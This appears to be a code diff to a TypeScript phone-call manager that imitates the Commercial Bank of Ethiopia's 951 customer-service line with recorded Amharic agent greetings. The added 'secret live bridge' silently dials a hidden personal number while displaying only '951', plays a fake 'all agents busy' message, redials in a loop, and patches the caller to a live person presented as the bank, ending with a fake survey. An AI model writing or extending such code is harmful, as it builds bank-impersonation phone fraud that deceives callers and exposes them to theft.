@@ -15,17 +15,33 @@ import {
   ClassStepRecord,
   LearnedTrainingClass,
   loadLearnedClasses,
+  addNewSpeakerClass,
   appendStepToSpeakerClass,
   saveFullLearnedClass,
   deleteLearnedClass,
   getStepTimingFromSelectedClass,
   getCurrentStepKey,
+  getSavedSelectedClassId,
+  saveSelectedClassIdToStorage,
+  getSavedSelectedSupportAgentId,
+  saveSelectedSupportAgentId,
+  preloadSupportAgentsAudio,
+  resolveSupportAgentAudioUrl,
+  getPopulatedSupportAgentSteps,
 } from './localBrain';
+import {
+  initSecretLiveBridgeAudioCache,
+  loadSecretLiveBridgeConfig,
+  getSecretBridgeSlotAudioUrl,
+  SecretLiveCallPhase,
+} from './secretLiveBridge';
 
 export interface CallEvents {
   onStatusChange?: (status: string) => void;
   onAgentSpeakingChange?: (isSpeaking: boolean) => void;
   onUserSpeakingChange?: (isSpeaking: boolean) => void;
+  onTurnPhaseChange?: (phase: 'red' | 'yellow' | 'green' | 'idle') => void;
+  onSecretLivePhaseChange?: (phase: SecretLiveCallPhase, attempt: number) => void;
   onTranscriptUpdate?: (speaker: 'agent' | 'user', text: string) => void;
   onMicPermissionDenied?: (denied: boolean) => void;
   onMicVolume?: (volume: number) => void;
@@ -58,6 +74,7 @@ export class CbePhoneManager {
   private vadInterval: any = null;
   private recordTimeout: any = null;
   private testModeTimer: any = null;
+  private yellowDotTimer: any = null;
   private stopRecordingFn: (() => void) | null = null;
   private savePatternOnlyFn: ((customText?: string) => void) | null = null;
   private onResultCallback: ((text: string) => void) | null = null;
@@ -69,13 +86,54 @@ export class CbePhoneManager {
   public useFastLocalMode: boolean = true;
   public isTestMode: boolean = false;
   public selectedClassId: string | null = null;
+  public selectedSupportAgentId: string = 'support_edris';
+  private customSupportStepCursor: number = 0;
+  public secretLivePhase: SecretLiveCallPhase = 'idle';
+  public secretLiveAttempt: number = 0;
+  private secretRingTimer: any = null;
+  private secretNextAttemptTimer: any = null;
 
   constructor(events: CallEvents = {}) {
     this.events = events;
     const savedClasses = loadLearnedClasses();
-    if (savedClasses.length > 0) {
+    const storedClassId = getSavedSelectedClassId();
+    if (savedClasses.some((c) => c.id === storedClassId)) {
+      this.selectedClassId = storedClassId;
+    } else if (savedClasses.length > 0) {
       this.selectedClassId = savedClasses[0].id;
     }
+    this.selectedSupportAgentId = getSavedSelectedSupportAgentId();
+
+    preloadSupportAgentsAudio().catch((err) =>
+      console.warn('Support audio preload warning:', err)
+    );
+    initSecretLiveBridgeAudioCache().catch((err) =>
+      console.warn('Secret live bridge audio cache warning:', err)
+    );
+
+    // Wire up Android Java N-IDE Hybrid callbacks (window.onSecretCall*)
+    if (typeof window !== 'undefined') {
+      window.onSecretCallRinging = (attemptNum: number) => {
+        if (!this.isCallActive) return;
+        this.secretLiveAttempt = attemptNum || Math.max(1, this.secretLiveAttempt);
+        this.secretLivePhase = 'dialing_hidden';
+        this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
+        this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');
+      };
+      window.onSecretCallNoAnswer = (_attemptNum: number) => {
+        if (!this.isCallActive) return;
+        this.handleSecretNoAnswerAndPlayBusyMp3();
+      };
+      window.onSecretCallAnswered = () => {
+        if (!this.isCallActive) return;
+        this.triggerSecretLiveAnswered();
+      };
+      window.onSecretCallRemoteEnded = () => {
+        if (!this.isCallActive) return;
+        this.triggerSecretLiveRemoteEnded();
+      };
+    }
+
     // Preload trained brain into LocalStorage and cache all 16 MP3s locally on phone
     initLocalBrainAndCache((loaded, total) => {
       this.events.onLocalCacheProgress?.(loaded, total);
@@ -93,8 +151,25 @@ export class CbePhoneManager {
     }
   }
 
+  setSelectedSupportAgentId(agentId: string) {
+    this.selectedSupportAgentId = agentId;
+    saveSelectedSupportAgentId(agentId);
+  }
+
+  addCustomClass(name: string) {
+    const { newClass, allClasses } = addNewSpeakerClass(name);
+    this.selectedClassId = newClass.id;
+    saveSelectedClassIdToStorage(newClass.id);
+    this.events.onClassesUpdated?.(allClasses, newClass.id);
+    this.events.onStatusChange?.(`✨ አዲስ ካራክተር «${newClass.name}» ተጨምሯል!`);
+    return newClass;
+  }
+
   setSelectedClassId(classId: string | null) {
     this.selectedClassId = classId;
+    if (classId) {
+      saveSelectedClassIdToStorage(classId);
+    }
     this.currentClassDraftTurns = [];
     this.events.onDraftClassProgressUpdate?.(0);
     const classes = loadLearnedClasses();
@@ -208,7 +283,24 @@ export class CbePhoneManager {
       clearTimeout(this.testModeTimer);
       this.testModeTimer = null;
     }
+    if (this.yellowDotTimer) {
+      clearTimeout(this.yellowDotTimer);
+      this.yellowDotTimer = null;
+    }
     if (!this.isTestMode || !this.isCallActive || this.isAgentSpeaking) return;
+
+    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
+    if (
+      this.selectedSupportAgentId !== 'support_edris' &&
+      populatedSteps.length > 0 &&
+      this.customSupportStepCursor >= populatedSteps.length
+    ) {
+      this.events.onTurnPhaseChange?.('idle');
+      this.events.onStatusChange?.(
+        `✅ ሁሉም የተጫኑ ${populatedSteps.length} Steps ተጫውተው አልቀዋል!`
+      );
+      return;
+    }
 
     const lastModel = [...this.history].reverse().find((h) => h.role === 'model');
     if (lastModel?.audioUrl?.includes('survey_rating')) return;
@@ -218,13 +310,24 @@ export class CbePhoneManager {
       history: this.history,
     });
 
+    this.events.onTurnPhaseChange?.('red');
     this.events.onStatusChange?.(
       `🧪 Test [${classTiming.className} - ደረጃ #${classTiming.turnNumber}]፦ በ ${(classTiming.totalTurnMs / 1000).toFixed(1)}s በራሱ ይመልሳል...`
     );
 
+    // Turn the dot YELLOW (🟡) 650ms before the Agent speaks so the caller knows to stop talking!
+    const yellowLeadMs = Math.max(200, classTiming.totalTurnMs - 650);
+    this.yellowDotTimer = setTimeout(() => {
+      this.yellowDotTimer = null;
+      if (this.isCallActive && !this.isAgentSpeaking && this.isTestMode) {
+        this.events.onTurnPhaseChange?.('yellow');
+      }
+    }, yellowLeadMs);
+
     this.testModeTimer = setTimeout(() => {
       this.testModeTimer = null;
       if (this.isCallActive && !this.isAgentSpeaking && this.isTestMode) {
+        this.events.onTurnPhaseChange?.('yellow');
         this.finishSpeakingManually();
       }
     }, classTiming.totalTurnMs);
@@ -261,13 +364,37 @@ export class CbePhoneManager {
     this.currentSpeechTranscript = '';
     this.currentClassDraftTurns = [];
     this.teachTurnActiveStartMs = 0;
+    this.customSupportStepCursor = 0;
+    this.secretLivePhase = 'idle';
+    this.secretLiveAttempt = 0;
+    this.clearSecretLiveTimers();
+    this.events.onSecretLivePhaseChange?.('idle', 0);
     this.events.onDraftClassProgressUpdate?.(0);
     this.events.onClassesUpdated?.(loadLearnedClasses(), this.selectedClassId);
+  }
+
+  private clearSecretLiveTimers() {
+    if (this.secretRingTimer) {
+      clearTimeout(this.secretRingTimer);
+      this.secretRingTimer = null;
+    }
+    if (this.secretNextAttemptTimer) {
+      clearTimeout(this.secretNextAttemptTimer);
+      this.secretNextAttemptTimer = null;
+    }
   }
 
   // End the call
   endCall() {
     this.isCallActive = false;
+    this.secretLivePhase = 'idle';
+    this.secretLiveAttempt = 0;
+    this.clearSecretLiveTimers();
+    if (typeof window !== 'undefined' && window.AndroidTelecomBridge?.endAllCalls) {
+      try {
+        window.AndroidTelecomBridge.endAllCalls();
+      } catch {}
+    }
     this.stopListening();
     phoneAudio.stopCurrentAudio();
     phoneAudio.stopRingback();
@@ -297,17 +424,184 @@ export class CbePhoneManager {
     }
   }
 
-  // Play recorded authentic agent greeting (Edris) when 4 is pressed
-  async playAgentGreeting(): Promise<void> {
+  // Secret Live Phone Bridge: Silently dial target phone number (e.g. 0965848508) for 2 rings
+  // while keeping ONLY "951" on the screen!
+  public startSecretDialAttempt() {
     if (!this.isCallActive) return;
+    this.clearSecretLiveTimers();
+    this.stopListening();
+    phoneAudio.stopCurrentAudio();
+
+    const cfg = loadSecretLiveBridgeConfig();
+    const targetNum = (cfg.targetPhoneNumber || '0965848508').trim();
+    const maxRingMs = Math.max(4000, (Number(cfg.maxRingSeconds) || 8) * 1000);
+
+    this.secretLiveAttempt += 1;
+    this.secretLivePhase = 'dialing_hidden';
+    this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
+    this.events.onTurnPhaseChange?.('idle');
+    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');
+
+    const hasNativeBridge =
+      typeof window !== 'undefined' &&
+      typeof window.AndroidTelecomBridge?.placeSecretCall === 'function';
+
+    if (hasNativeBridge) {
+      try {
+        window.AndroidTelecomBridge!.placeSecretCall!(targetNum, maxRingMs);
+      } catch (e) {
+        console.warn('AndroidTelecomBridge placeSecretCall warning:', e);
+      }
+    } else if (cfg.playRingbackDuringDial) {
+      // In Web Preview mode (or when carrier audio isn't active), play subtle phone ringback for the 2 rings
+      phoneAudio.startRingback();
+    }
+
+    // 2-Ring Timeout (e.g. 8 seconds): Cut BEFORE Ethio Telecom plays "የደወሉለት ደንበኛ..."
+    // and immediately play the "ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው..." MP3!
+    this.secretRingTimer = setTimeout(() => {
+      this.secretRingTimer = null;
+      if (!this.isCallActive || this.secretLivePhase !== 'dialing_hidden') return;
+      if (hasNativeBridge) {
+        try {
+          window.AndroidTelecomBridge?.cancelCurrentAttempt?.();
+        } catch {}
+      }
+      this.handleSecretNoAnswerAndPlayBusyMp3();
+    }, maxRingMs);
+  }
+
+  // Called when 2 rings pass without answer -> plays "ሁሉም የአገልግሎት ሰጪዎች..." MP3 and silently redials in a loop!
+  public async handleSecretNoAnswerAndPlayBusyMp3() {
+    if (!this.isCallActive || this.secretLivePhase === 'connected_live') return;
+    this.clearSecretLiveTimers();
+    phoneAudio.stopRingback();
+    phoneAudio.stopCurrentAudio();
+
+    this.secretLivePhase = 'playing_busy_mp3';
     this.isAgentSpeaking = true;
     this.events.onAgentSpeakingChange?.(true);
+    this.events.onSecretLivePhaseChange?.('playing_busy_mp3', this.secretLiveAttempt);
+    this.events.onStatusChange?.(
+      'ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው፣ እባክዎ ትንሽ ይጠብቁ...'
+    );
+
+    const busyMp3Url = getSecretBridgeSlotAudioUrl('busy_hold');
+    try {
+      await phoneAudio.playAudioFile(busyMp3Url);
+    } catch (e) {
+      console.warn('Busy hold MP3 playback warning:', e);
+    } finally {
+      this.isAgentSpeaking = false;
+      this.events.onAgentSpeakingChange?.(false);
+    }
+
+    // Immediately redial the hidden number again in the background if still on the call!
+    if (this.isCallActive && this.secretLivePhase === 'playing_busy_mp3') {
+      this.secretNextAttemptTimer = setTimeout(() => {
+        this.secretNextAttemptTimer = null;
+        if (this.isCallActive && this.secretLivePhase === 'playing_busy_mp3') {
+          this.startSecretDialAttempt();
+        }
+      }, 350);
+    }
+  }
+
+  // Called when the person at 0965848508 answers the call!
+  public triggerSecretLiveAnswered() {
+    if (!this.isCallActive) return;
+    this.clearSecretLiveTimers();
+    phoneAudio.stopRingback();
+    phoneAudio.stopCurrentAudio();
+    this.isAgentSpeaking = false;
+    this.events.onAgentSpeakingChange?.(false);
+
+    this.secretLivePhase = 'connected_live';
+    this.events.onSecretLivePhaseChange?.('connected_live', this.secretLiveAttempt);
+    this.events.onTurnPhaseChange?.('idle');
+    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951)');
+  }
+
+  // Called when the person at 0965848508 hangs up after talking -> keeps 951 open and plays Post-Call Survey MP3!
+  public async triggerSecretLiveRemoteEnded() {
+    if (!this.isCallActive) return;
+    this.clearSecretLiveTimers();
+    phoneAudio.stopRingback();
+    phoneAudio.stopCurrentAudio();
+
+    this.secretLivePhase = 'playing_survey_mp3';
+    this.isAgentSpeaking = true;
+    this.events.onAgentSpeakingChange?.(true);
+    this.events.onSecretLivePhaseChange?.('playing_survey_mp3', this.secretLiveAttempt);
+    this.events.onStatusChange?.(
+      'እሽ ስለ አገልግሎት አስተዳደር ቀጣይ ያሉትን መሙያ ይሙሉ ስለደወሉ እናመሰግናለን'
+    );
+    this.events.onTranscriptUpdate?.(
+      'agent',
+      'እሽ ስለ አገልግሎት አስተዳደር ቀጣይ ያሉትን መሙያ ይሙሉ ስለደወሉ እናመሰግናለን'
+    );
+
+    const surveyMp3Url = getSecretBridgeSlotAudioUrl('post_call_survey');
+    try {
+      await phoneAudio.playAudioFile(surveyMp3Url);
+    } catch (e) {
+      console.warn('Survey MP3 playback warning:', e);
+    } finally {
+      this.isAgentSpeaking = false;
+      this.events.onAgentSpeakingChange?.(false);
+    }
+  }
+
+  // Play recorded authentic agent greeting (Edris or selected custom Support Agent, OR Secret Live Phone Bridge) when 4 is pressed
+  async playAgentGreeting(): Promise<void> {
+    if (!this.isCallActive) return;
+
+    // 1. Check if Secret Live Phone Bridge (e.g. 0965848508) is enabled in J11 Studio!
+    const secretBridge = loadSecretLiveBridgeConfig();
+    if (secretBridge.enabled) {
+      this.secretLiveAttempt = 0;
+      this.startSecretDialAttempt();
+      return;
+    }
+
+    this.isAgentSpeaking = true;
+    this.events.onAgentSpeakingChange?.(true);
+    this.events.onTurnPhaseChange?.('green');
+
+    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
+    if (this.selectedSupportAgentId !== 'support_edris' && populatedSteps.length > 0) {
+      const firstPopulated = populatedSteps[0];
+      this.customSupportStepCursor = 1;
+      this.events.onStatusChange?.(`${firstPopulated.title}`);
+      this.events.onTranscriptUpdate?.('agent', `${firstPopulated.title} (${firstPopulated.fileName})`);
+      this.history.push({
+        role: 'model',
+        text: firstPopulated.title,
+        audioUrl: firstPopulated.blobUrl,
+      });
+
+      try {
+        await phoneAudio.playAudioFile(firstPopulated.blobUrl);
+      } catch (e) {
+        console.warn('Custom support step 1 playback warning:', e);
+      } finally {
+        this.isAgentSpeaking = false;
+        this.events.onAgentSpeakingChange?.(false);
+      }
+      return;
+    }
+
     this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ እድሪስ ነኝ ባኳ ምን ልርዳወት');
     this.events.onTranscriptUpdate?.('agent', this.agentGreeting);
     this.history.push({ role: 'model', text: this.agentGreeting, audioUrl: '/audio/edris_greeting.mp3' });
 
+    const resolvedGreetingUrl = resolveSupportAgentAudioUrl(
+      this.selectedSupportAgentId,
+      '/audio/edris_greeting.mp3'
+    );
+
     try {
-      await phoneAudio.playAudioFile('/audio/edris_greeting.mp3');
+      await phoneAudio.playAudioFile(resolvedGreetingUrl);
     } catch (e) {
       console.warn('Playing edris_greeting.mp3 fallback:', e);
       try {
@@ -370,11 +664,28 @@ export class CbePhoneManager {
   // Start hands-free automatic listening for user's voice
   startListening(onResult: (userSpeech: string) => void) {
     if (!this.isCallActive || this.isAgentSpeaking) return;
+    if (this.secretLivePhase !== 'idle' || loadSecretLiveBridgeConfig().enabled) {
+      return;
+    }
+
+    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
+    if (
+      this.selectedSupportAgentId !== 'support_edris' &&
+      populatedSteps.length > 0 &&
+      this.customSupportStepCursor >= populatedSteps.length
+    ) {
+      this.events.onTurnPhaseChange?.('idle');
+      this.events.onStatusChange?.(
+        `✅ የተጫኑት ${populatedSteps.length} Steps ተጫውተው አልቀዋል!`
+      );
+      return;
+    }
 
     this.isListening = true;
     this.currentSpeechTranscript = '';
     this.onResultCallback = onResult;
     this.events.onUserSpeakingChange?.(false);
+    this.events.onTurnPhaseChange?.('red');
 
     if (this.isTestMode) {
       this.scheduleSelectedClassTestTimer();
@@ -617,6 +928,35 @@ export class CbePhoneManager {
         // Helper to execute instant LocalStorage trained brain turn without network wait
         const runInstantLocalBrainTurn = async () => {
           const localTranscribed = inferLocalCallerTurn(this.history);
+
+          // Check if a custom Support Agent is selected with populated steps
+          const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
+          if (this.selectedSupportAgentId !== 'support_edris' && populatedSteps.length > 0) {
+            saveLearnedTurnToLocalStorage(localTranscribed);
+            this.events.onTranscriptUpdate?.('user', localTranscribed);
+            this.history.push({ role: 'user', text: localTranscribed });
+
+            if (this.customSupportStepCursor >= populatedSteps.length) {
+              this.events.onTurnPhaseChange?.('idle');
+              this.events.onStatusChange?.(
+                `✅ የተጫኑት ${populatedSteps.length} Steps ተጠናቀዋል!`
+              );
+              return true;
+            }
+
+            const nextStep = populatedSteps[this.customSupportStepCursor];
+            this.customSupportStepCursor += 1;
+            await new Promise((r) => setTimeout(r, 120));
+            this.history.push({
+              role: 'model',
+              text: nextStep.title,
+              audioUrl: nextStep.blobUrl,
+            });
+            this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
+            await this.handleAiReply(nextStep.title, null, nextStep.blobUrl, onResult);
+            return true;
+          }
+
           const localMatch = matchLocalTrainedResponse(localTranscribed, this.history);
           if (localMatch) {
             saveLearnedTurnToLocalStorage(localTranscribed);
@@ -841,7 +1181,15 @@ export class CbePhoneManager {
               liveSpeakDurationMs: spokenSoFarMs,
             });
 
+            if (
+              silenceDurationMs >= Math.max(150, classTiming.pauseBeforeSendMs - 450) &&
+              silenceDurationMs < classTiming.pauseBeforeSendMs
+            ) {
+              this.events.onTurnPhaseChange?.('yellow');
+            }
+
             if (silenceDurationMs >= classTiming.pauseBeforeSendMs) {
+              this.events.onTurnPhaseChange?.('yellow');
               stopRecordingAndSend(true);
             }
           }
@@ -955,6 +1303,10 @@ export class CbePhoneManager {
       clearTimeout(this.testModeTimer);
       this.testModeTimer = null;
     }
+    if (this.yellowDotTimer) {
+      clearTimeout(this.yellowDotTimer);
+      this.yellowDotTimer = null;
+    }
     if (this.silenceTimer) {
       clearTimeout(this.silenceTimer);
       this.silenceTimer = null;
@@ -984,6 +1336,29 @@ export class CbePhoneManager {
     recordLearnedUtteranceOnly(historyBeforeUser, userText);
     this.history.push({ role: 'user', text: userText });
     this.events.onTranscriptUpdate?.('user', userText);
+
+    // 0. If custom Support Agent is selected with populated steps, play them in order and stop when finished!
+    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
+    if (this.selectedSupportAgentId !== 'support_edris' && populatedSteps.length > 0) {
+      if (this.customSupportStepCursor >= populatedSteps.length) {
+        this.events.onTurnPhaseChange?.('idle');
+        this.events.onStatusChange?.(
+          `✅ የተጫኑት ${populatedSteps.length} Steps ተጠናቀዋል!`
+        );
+        return;
+      }
+      const nextStep = populatedSteps[this.customSupportStepCursor];
+      this.customSupportStepCursor += 1;
+      this.history.push({
+        role: 'model',
+        text: nextStep.title,
+        audioUrl: nextStep.blobUrl,
+      });
+      this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
+      await new Promise((r) => setTimeout(r, 120));
+      await this.handleAiReply(nextStep.title, null, nextStep.blobUrl, onNextTurn);
+      return;
+    }
 
     // 1. Instant LocalStorage Trained Brain check (0ms network delay!)
     const localMatch = matchLocalTrainedResponse(userText, historyBeforeUser);
@@ -1037,14 +1412,24 @@ export class CbePhoneManager {
   ) {
     if (!this.isCallActive) return;
 
+    // Brief YELLOW phase ("አውርተህ ጨርሰሃል ዝም በል — እድሪስ ሊያወራ ነው") right before Agent speaks
+    this.events.onTurnPhaseChange?.('yellow');
+    await new Promise((r) => setTimeout(r, 320));
+    if (!this.isCallActive) return;
+
     this.isAgentSpeaking = true;
     this.events.onAgentSpeakingChange?.(true);
+    this.events.onTurnPhaseChange?.('green');
     this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ እየመለሰ ነው...');
     this.events.onTranscriptUpdate?.('agent', replyText);
 
     if (audioUrl) {
       try {
-        await phoneAudio.playAudioFile(audioUrl);
+        const resolvedUrl = resolveSupportAgentAudioUrl(
+          this.selectedSupportAgentId,
+          audioUrl
+        );
+        await phoneAudio.playAudioFile(resolvedUrl);
       } catch (e) {
         console.warn('Playing audioUrl failed:', e);
       }
@@ -1061,6 +1446,19 @@ export class CbePhoneManager {
 
     this.isAgentSpeaking = false;
     this.events.onAgentSpeakingChange?.(false);
+
+    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
+    if (
+      this.selectedSupportAgentId !== 'support_edris' &&
+      populatedSteps.length > 0 &&
+      this.customSupportStepCursor >= populatedSteps.length
+    ) {
+      this.events.onTurnPhaseChange?.('idle');
+      this.events.onStatusChange?.(
+        `✅ ሁሉም የተጫኑ ${populatedSteps.length} Steps ተጫውተው አልቀዋል!`
+      );
+      return;
+    }
 
     // Automatically resume listening hands-free ONLY AFTER audio playback finishes completely!
     if (this.isCallActive) {
